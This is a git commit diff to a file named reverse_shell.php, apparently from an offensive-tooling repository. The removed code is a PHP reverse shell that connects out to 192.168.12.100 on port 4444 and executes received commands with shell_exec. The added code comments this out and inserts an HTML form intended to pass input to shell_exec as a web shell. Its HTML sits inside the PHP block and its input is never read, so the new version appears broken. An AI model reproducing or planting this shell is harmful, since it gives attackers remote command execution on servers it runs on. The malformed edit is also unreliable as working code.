900d5761c16cf223d837350c7336d58a3b3ebb68
Fox0nTheRun <70911096+Fox0nTheRun@users.noreply.github.com>
2021-07-15 21:49:35 +0800

    Update reverse_shell.php

--- reverse_shell.php
+++ reverse_shell.php
@@ -1,34 +1,37 @@
 <?php 
-$socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
+//$socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
 // Socket will be bind to any IP address on port 51234
-socket_bind($socket, '0.0.0.0', 51234);
+//socket_bind($socket, '0.0.0.0', 51234);
 // Change the listening port in socket_connect()
-$connection = socket_connect($socket, '192.168.12.100', 4444);
-$output = array();;
-$message = "# ";
-while ($socket && $connection){
-	$message = "# ";
-	socket_send($socket, utf8_encode($message), strlen($message), MSG_EOF);
+//$connection = socket_connect($socket, '192.168.12.100', 4444);
+//$output = array();;
+//$message = "# ";
+//while ($socket && $connection){
+	//$message = "# ";
+	//socket_send($socket, utf8_encode($message), strlen($message), MSG_EOF);
+	<form method='GET'>
+		<input type='text' name='data' /></input>
+		<input type='submit' name='submit'/></input>
+	</form>
 	
-	
-	$read = false;
-	while($read == false){
+	//$read = false;
+	//while($read == false){
 	// Change the 3rd value to modify the data length to be received
-	$read = socket_recv($socket, $data, 1024, MSG_DONTWAIT);
+	//$read = socket_recv($socket, $data, 1024, MSG_DONTWAIT);
 	}
-	$data = trim(utf8_decode($data));
-	if($data != 'exit' ){
-		if(!(empty($read))){
+	//$data = trim(utf8_decode($data));
+	//if($data != 'exit' ){
+		//if(!(empty($read))){
 		$output = shell_exec($data);
-		socket_send($socket, $output, strlen($output) , MSG_EOF);
-		$output = array();
-		}
+		//socket_send($socket, $output, strlen($output) , MSG_EOF);
+		//$output = array();
+		//}
 		
-	}
-	else{
-		$connection = false;
-		socket_close($socket);
-	}
+	//}
+	//else{
+		//$connection = false;
+		//socket_close($socket);
+	//}
 	
 	
 	
